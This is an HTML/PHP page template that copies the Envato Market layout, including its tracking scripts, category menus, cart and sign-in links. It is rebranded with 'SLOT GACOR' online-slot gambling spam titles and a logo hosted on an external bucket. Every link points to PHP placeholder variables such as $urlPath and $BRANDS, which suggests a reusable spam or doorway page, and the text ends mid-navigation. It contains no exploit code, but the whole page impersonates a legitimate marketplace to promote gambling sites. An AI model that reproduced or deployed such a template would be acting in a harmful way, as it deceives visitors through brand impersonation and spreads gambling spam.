		<body class="color-scheme-light" data-view="app impressionTracker" data-responsive="true" data-user-signed-in="false" __processed_046ac43c-cdf6-4311-9a75-3ea1775342f5__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuMjYiLCJzY29yZSI6MjAwMjYwfV0=">
			<script src="https://public-assets.envato-static.com/assets/gtm_measurements-40b0a0f82bafab0a0bb77fc35fe1da0650288300b85126c95b4676bcff6e4584.js" nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript"></script>
			<noscript>
				<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W8KL5Q5" height="0" width="0" style="display:none;visibility:hidden">
				</iframe>
			</noscript>

			<noscript>
				<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KGCDGPL6" height="0" width="0" style="display:none;visibility:hidden">
				</iframe>
			</noscript>
			<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		(function(){function normalizeAttributeValue(value){if(value===undefined||value===null)return undefined
		var normalizedValue
		if(Array.isArray(value)){normalizedValue=normalizedValue||value.map(normalizeAttributeValue).filter(Boolean).join(', ')}normalizedValue=normalizedValue||value.toString().toLowerCase().trim().replace(/&amp;/g,'&').replace(/&#39;/g,"'").replace(/\s+/g,' ')
		if(normalizedValue==='')return undefined
		return normalizedValue}var pageAttributes={app_name:normalizeAttributeValue('Marketplace'),app_env:normalizeAttributeValue('production'),app_version:normalizeAttributeValue('f7d8b3d494288b34cb00105ee5d230d68b0ccca7'),page_type:normalizeAttributeValue('item'),page_location:window.location.href,page_title:document.title,page_referrer:document.referrer,ga_param:normalizeAttributeValue(''),event_attributes:null,user_attributes:{user_id:normalizeAttributeValue(''),market_user_id:normalizeAttributeValue(''),}}
		dataLayer.push(pageAttributes)
		dataLayer.push({event:'analytics_ready',event_attributes:{event_type:'user',custom_timestamp:Date.now()}})})();
		//]]></script>
			<style>.live-preview-btn--blue .live-preview{background-color:#00857e}.live-preview-btn--blue .live-preview:hover,.live-preview-btn--blue .live-preview:focus{background-color:#0bf}</style>

			<div class="page" bis_skin_checked="1">
				<div class="page__off-canvas--left overflow" bis_skin_checked="1">
					<div class="off-canvas-left js-off-canvas-left" bis_skin_checked="1">
						<div class="off-canvas-left__top" bis_skin_checked="1">
							<a href="<?php echo $urlPath;?>">Envato Market</a>
						</div>
						<div class="off-canvas-left__current-site -color-themeforest" bis_skin_checked="1">
							<span class="off-canvas-left__site-title">
								Web Themes &amp; Templates
							</span>
							<a class="off-canvas-left__current-site-toggle -white-arrow -color-themeforest" data-view="dropdown" data-dropdown-target=".off-canvas-left__sites" href="<?php echo $urlPath;?>"></a>
						</div>
						<div class="off-canvas-left__sites is-hidden" id="off-canvas-sites" bis_skin_checked="1">
							<a class="off-canvas-left__site" href="h<?php echo $urlPath;?>">
								<span class="off-canvas-left__site-title">
									Code
								</span>
								<i class="e-icon -icon-right-open"></i>
							</a> <a class="off-canvas-left__site" href="<?php echo $urlPath;?>">
								<span class="off-canvas-left__site-title">
									Video
								</span>
								<i class="e-icon -icon-right-open"></i>
							</a> <a class="off-canvas-left__site" href="<?php echo $urlPath;?>">
								<span class="off-canvas-left__site-title">
									Audio
								</span>
								<i class="e-icon -icon-right-open"></i>
							</a> <a class="off-canvas-left__site" href="<?php echo $urlPath;?>">
								<span class="off-canvas-left__site-title">
									Graphics
								</span>
								<i class="e-icon -icon-right-open"></i>
							</a> <a class="off-canvas-left__site" href="<?php echo $urlPath;?>">
								<span class="off-canvas-left__site-title">
									Photos
								</span>
								<i class="e-icon -icon-right-open"></i>
							</a> <a class="off-canvas-left__site" href="<?php echo $urlPath;?>">
								<span class="off-canvas-left__site-title">
									3D Files
								</span>
								<i class="e-icon -icon-right-open"></i>
							</a>
						</div>
						<div class="off-canvas-left__search" bis_skin_checked="1">
							<form id="search" action="<?php echo $urlPath;?>" accept-charset="UTF-8" method="get">
								<div class="search-field -border-none" bis_skin_checked="1">
									<div class="search-field__input" bis_skin_checked="1">
										<input id="term" name="term" type="search" placeholder="Search" class="search-field__input-field">
									</div>
									<button class="search-field__button" type="submit">
										<i class="e-icon -icon-search"><span class="e-icon__alt">Search</span></i>
									</button>
								</div>
							</form>
						</div>
						<ul>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-all-items" href="<?php echo $urlPath;?>">
									All Items
								</a>
								<ul class="is-hidden" id="off-canvas-all-items">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Files</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Featured Files</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Top New Files</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Follow Feed</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Top Authors</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Top New
											Authors</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Public Collections</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">View All Categories</a>
									</li>
								</ul>

							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-wordpress" href="<?php echo $urlPath;?>">
									WordPress
								</a>
								<ul class="is-hidden" id="off-canvas-wordpress">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Show all
											WordPress</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Items</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Blog /
											Magazine</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">BuddyPress</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Corporate</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Creative</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Directory &amp; Listings</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">eCommerce</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Education</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Elementor</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Entertainment</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Mobile</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Nonprofit</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Real
											Estate</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Retail</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Technology</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Wedding</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Miscellaneous</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">WordPress Plugins</a>
									</li>
								</ul>

							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-elementor" href="<?php echo $urlPath;?>">
									Elementor
								</a>
								<ul class="is-hidden" id="off-canvas-elementor">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Template Kits</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Plugins</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Themes</a>
									</li>
								</ul>

							</li>
							<li>

								<a class="off-canvas-category-link--empty" href="<?php echo $urlPath;?>">
									Hosting
								</a>
							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-html" href="<?php echo $urlPath;?>">
									HTML
								</a>
								<ul class="is-hidden" id="off-canvas-html">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Show all
											HTML</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Items</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Admin Templates</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Corporate</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Creative</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Entertainment</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Mobile</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Nonprofit</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Personal</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Retail</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Specialty Pages</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Technology</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Wedding</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Miscellaneous</a>
									</li>
								</ul>

							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-shopify" href="<?php echo $urlPath;?>">
									Shopify
								</a>
								<ul class="is-hidden" id="off-canvas-shopify">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Show all
											Shopify</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Items</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Fashion</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Shopping</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Health &amp; Beauty</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Technology</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Entertainment</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Miscellaneous</a>
									</li>
								</ul>

							</li>
							<li>

								<a class="off-canvas-category-link--empty" href="<?php echo $urlPath;?>">
									Jamstack
								</a>
							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-marketing" href="<?php echo $urlPath;?>">
									Marketing
								</a>
								<ul class="is-hidden" id="off-canvas-marketing">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Show all
											Marketing</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Items</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Email Templates</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Landing Pages</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Unbounce Landing Pages</a>
									</li>
								</ul>

							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-cms" href="<?php echo $urlPath;?>">
									CMS
								</a>
								<ul class="is-hidden" id="off-canvas-cms">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Show all CMS</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Items</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Concrete5</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Drupal</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">HubSpot CMS Hub</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Joomla</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">MODX
											Themes</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Moodle</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Webflow</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Weebly</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Miscellaneous</a>
									</li>
								</ul>

							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ecommerce" href="<?php echo $urlPath;?>">
									eCommerce
								</a>
								<ul class="is-hidden" id="off-canvas-ecommerce">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Show all
											eCommerce</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Items</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">WooCommerce</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">BigCommerce</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Drupal Commerce</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Easy Digital Downloads</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Ecwid</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Magento</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">OpenCart</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">PrestaShop</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Shopify</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Ubercart</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">VirtueMart</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Zen
											Cart</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Miscellaneous</a>
									</li>
								</ul>

							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-ui-templates" href="<?php echo $urlPath;?>">
									UI Templates
								</a>
								<ul class="is-hidden" id="off-canvas-ui-templates">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Popular Items</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Figma</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Adobe
											XD</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Photoshop</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Sketch</a>
									</li>
								</ul>

							</li>
							<li>

								<a class="off-canvas-category-link--empty" href="<?php echo $urlPath;?>">
									Plugins
								</a>
							</li>
							<li>
								<a class="off-canvas-category-link" data-view="dropdown" data-dropdown-target="#off-canvas-more" href="<?php echo $urlPath;?>">
									More
								</a>
								<ul class="is-hidden" id="off-canvas-more">
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Blogging</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Courses</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Facebook Templates</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Free Elementor Templates</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Free
											WordPress Themes</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Forums</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Ghost
											Themes</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub" href="<?php echo $urlPath;?>">Tumblr</a>
									</li>
									<li>
										<a class="off-canvas-category-link--sub external-link elements-nav__category-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;sub nav&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionName&quot;:&quot;Unlimited Creative Assets&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="<?php echo $urlPath;?>">Unlimited
											Creative Assets</a>
									</li>
								</ul>

							</li>

							<li>
								<a class="elements-nav__category-link external-link" target="_blank" data-analytics-view-payload="{&quot;eventName&quot;:&quot;view_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" data-analytics-click-payload="{&quot;eventName&quot;:&quot;select_promotion&quot;,&quot;contextDetail&quot;:&quot;site switcher&quot;,&quot;ecommerce&quot;:{&quot;promotionId&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionName&quot;:&quot;switcher_mobile_31JUL2024&quot;,&quot;promotionType&quot;:&quot;elements referral&quot;}}" href="<?php echo $urlPath;?>">Unlimited 
									ABOUTS</a>
							</li>

						</ul>

					</div>

				</div>

				<div class="page__off-canvas--right overflow" bis_skin_checked="1">
					<div class="off-canvas-right" bis_skin_checked="1">
						<a class="off-canvas-right__link--cart" href="<?php echo $urlPath;?>">
							Guest Cart
							<div class="shopping-cart-summary is-empty" data-view="cartCount" bis_skin_checked="1">
								<span class="js-cart-summary-count shopping-cart-summary__count">0</span>
								<i class="e-icon -icon-cart"></i>
							</div>
						</a>
						<a class="off-canvas-right__link" href="<?php echo $ampmek;?>">
							Create an Envato Account
							<i class="e-icon -icon-envato"></i>
						</a>
						<a class="off-canvas-right__link" href="<?php echo $ampmek;?>">
							Sign In
							<i class="e-icon -icon-login"></i>
						</a>
					</div>

				</div>

				<div class="page__canvas" bis_skin_checked="1">
					<div class="canvas" bis_skin_checked="1">
						<div class="canvas__header" bis_skin_checked="1">

							<header class="site-header">
								<div class="site-header__mini is-hidden-desktop" bis_skin_checked="1">
									<div class="header-mini" bis_skin_checked="1">
										<div class="header-mini__button--cart" bis_skin_checked="1">
											<a class="btn btn--square" href="<?php echo $urlPath;?>">
												<svg width="14px" height="14px" viewBox="0 0 14 14" class="header-mini__button-cart-icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
													<title>Cart</title>
													<path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 187.66 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.967 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
													</path>

												</svg>


												<span class="is-hidden">Cart</span>
												<span class="header-mini__button-cart-cart-amount is-hidden">
													0
												</span>
											</a>
										</div>
										<div class="header-mini__button--account" bis_skin_checked="1">
											<a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="right" href="<?php echo $urlPath;?>">
												<i class="e-icon -icon-person"></i>
												<span class="is-hidden">Account</span>
											</a>
										</div>

										<div class="header-mini__button--categories" bis_skin_checked="1">
											<a class="btn btn--square" data-view="offCanvasNavToggle" data-off-canvas="left" href="<?php echo $urlPath;?>">
												<i class="e-icon -icon-hamburger"></i>
												<span class="is-hidden">Sites, Search &amp; Categories</span>
											</a>
										</div>

										<div class="header-mini__logo" bis_skin_checked="1">
											<a href="<?php echo $urlPath;?>">
												<img alt="SLOT GACOR" src="https://pub-102b165e0ba64aa4866e078d46aa5697.r2.dev/slotgacor.png" style="height:40px; width:auto; display:inline-block;">
											</a>
										</div>



									</div>

								</div>

								<div class="global-header is-hidden-tablet-and-below" bis_skin_checked="1">

									<div class="grid-container -layout-wide" bis_skin_checked="1">
										<div class="global-header__wrapper" bis_skin_checked="1">
											<a href="<?php echo $urlPath;?>">
												<img height="50" alt="SLOT GACOR" class="global-header__logo" src="https://pub-102b165e0ba64aa4866e078d46aa5697.r2.dev/slotgacor.png">
											</a>
											<nav class="global-header-menu" role="navigation">
												<ul class="global-header-menu__list">
													<li class="global-header-menu__list-item">
														<a class="global-header-menu__link" href="<?php echo $urlPath;?>">
															<span class="global-header-menu__link-text">
																SLOT GACOR HARI INI
															</span>
														</a>
													</li>
													<li class="global-header-menu__list-item">
														<a class="global-header-menu__link" href="<?php echo $urlPath;?>">
															<span class="global-header-menu__link-text">
																SITUS GACOR 777
															</span>
														</a>
													</li>


													<li data-view="globalHeaderMenuDropdownHandler" class="global-header-menu__list-item--with-dropdown">
														<a data-lazy-load-trigger="mouseover" class="global-header-menu__link" href="<?php echo $urlPath;?>">
															<svg width="16px" height="16px" viewBox="0 0 16 16" class="global-header-menu__icon" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
																<title>Menu</title>
																<path d="M3.5 2A1.5 1.5 0 0 1 5 3.5 1.5 1.5 0 0 1 3.5 5 1.5 1.5 0 0 1 2 3.5 1.5 1.5 0 0 1 3.5 2zM8 2a1.5 1.5 0 0 1 1.5 1.5A1.5 1.5 0 0 1 8 5a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 8 2zM12.5 2A1.5 1.5 0 0 1 14 3.5 1.5 1.5 0 0 1 12.5 5 1.5 1.5 0 0 1 11 3.5 1.5 1.5 0 0 1 12.5 2zM3.5 6.5A1.5 1.5 0 0 1 5 8a1.5 1.5 0 0 1-1.5 1.5A1.5 1.5 0 0 1 2 8a1.5 1.5 0 0 1 1.5-1.5zM8 6.5A1.5 1.5 0 0 1 9.5 8 1.5 1.5 0 0 1 8 9.5 1.5 1.5 0 0 1 6.5 8 1.5 1.5 0 0 1 8 6.5zM12.5 6.5A1.5 1.5 0 0 1 14 8a1.5 1.5 0 0 1-1.5 1.5A1.5 1.5 0 0 1 11 8a1.5 1.5 0 0 1 1.5-1.5zM3.5 11A1.5 1.5 0 0 1 5 12.5 1.5 1.5 0 0 1 3.5 14 1.5 1.5 0 0 1 2 12.5 1.5 1.5 0 0 1 3.5 11zM8 11a1.5 1.5 0 0 1 1.5 1.5A1.5 1.5 0 0 1 8 14a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 8 11zM12.5 11a1.5 1.5 0 0 1 1.5 1.5 1.5 1.5 0 0 1-1.5 1.5 1.5 1.5 0 0 1-1.5-1.5 1.5 1.5 0 0 1 1.5-1.5z">
																</path>

															</svg>

															<span class="global-header-menu__link-text">
																Our Products
															</span>
														</a>
													<li class="global-header-menu__list-item -background-light -border-radius">
														<a id="spec-link-cart" class="global-header-menu__link h-pr1" href="<?php echo $urlPath;?>">

															<svg width="16px" height="16px" viewBox="0 0 16 16" class="global-header-menu__icon global-header-menu__icon-cart" xmlns="http://www.w3.org/2000/svg" aria-labelledby="title" role="img">
																<title>Cart</title>
																<path d="M 0.009 1.349 C 0.009 1.753 0.347 2.086 0.765 2.086 C 0.765 2.086 0.766 2.086 0.767 2.086 L 0.767 2.09 L 2.289 2.09 L 5.029 7.698 L 4.001 9.507 C 3.88 9.714 3.812 9.958 3.812 10.217 C 3.812 11.028 4.496 11.694 5.335 11.694 L 14.469 11.694 L 14.469 11.694 C 14.886 11.693 15.227 11.36 15.227 10.957 C 15.227 10.552 14.886 10.221 14.469 10.219 L 14.469 10.217 L 5.653 10.217 C 5.547 10.217 5.463 10.135 5.463 10.031 L 5.487 9.943 L 6.171 8.738 L 11.842 8.738 C 12.415 8.738 12.917 8.436 13.175 7.978 L 15.901 3.183 C 15.96 3.08 15.991 2.954 15.991 2.828 C 15.991 2.422 15.65 2.09 187.66 2.09 L 3.972 2.09 L 3.481 1.077 L 3.466 1.043 C 3.343 0.79 3.084 0.612 2.778 0.612 C 2.967 0.612 0.765 0.612 0.765 0.612 C 0.347 0.612 0.009 0.943 0.009 1.349 Z M 3.819 13.911 C 3.819 14.724 4.496 15.389 5.335 15.389 C 6.171 15.389 6.857 14.724 6.857 13.911 C 6.857 13.097 6.171 12.434 5.335 12.434 C 4.496 12.434 3.819 13.097 3.819 13.911 Z M 11.431 13.911 C 11.431 14.724 12.11 15.389 12.946 15.389 C 13.784 15.389 14.469 14.724 14.469 13.911 C 14.469 13.097 13.784 12.434 12.946 12.434 C 12.11 12.434 11.431 13.097 11.431 13.911 Z">
																</path>

															</svg>


															<span class="global-header-menu__link-cart-amount is-hidden" data-view="headerCartCount" data-test-id="header_cart_count">0</span>
														</a>
													</li>

													<li class="global-header-menu__list-item -background-light -border-radius">
														<a class="global-header-menu__link h-pl1" data-view="modalAjax" href="<?php echo $urlPath;?>">
															<span id="spec-user-username" class="global-header-menu__link-text">
																Sign In
															</span>
														</a>
													</li>

												</ul>
											</nav>
										</div>
									</div>
								</div>


								<div class="site-header__sites is-hidden-tablet-and-below" bis_skin_checked="1">
									<div class="header-sites header-site-titles" bis_skin_checked="1">
										<div class="grid-container -layout-wide" bis_skin_checked="1">
											<nav class="header-site-titles__container">
												<div class="header-site-titles__site" bis_skin_checked="1">
													<a class="header-site-titles__link t-link is-active" alt="Web Templates" href="<?php echo $urlPath;?>">SITUS SLOT GACOR</a>
												</div>
												<div class="header-site-titles__site" bis_skin_checked="1">
													<a class="header-site-titles__link t-link" alt="Code" href="<?php echo $urlPath;?>">SLOT GACOR HARI INI</a>
												</div>
												<div class="header-site-titles__site" bis_skin_checked="1">
													<a class="header-site-titles__link t-link" alt="Video" href="<?php echo $urlPath;?>">SITUS SLOT</a>
												</div>
												<div class="header-site-titles__site" bis_skin_checked="1">
													<a class="header-site-titles__link t-link" alt="Music" href="<?php echo $urlPath;?>">SLOT</a>
												</div>
												<div class="header-site-titles__site" bis_skin_checked="1">
													<a class="header-site-titles__link t-link" alt="Graphics" href="<?php echo $urlPath;?>">SITUS GACOR</a>
												</div>
												<div class="header-site-titles__site" bis_skin_checked="1">
													<a class="header-site-titles__link t-link" alt="Photos" href="<?php echo $urlPath;?>"><?php echo $BRANDS;?></a>
												</div>
												<div class="header-site-titles__site" bis_skin_checked="1">
													<a class="header-site-titles__link t-link" alt="3D Files" href="<?php echo $urlPath;?>"><?php echo $BRANDS;?> GACOR</a>
												</div>

												<div class="header-site-titles__site elements-nav__container" bis_skin_checked="1">
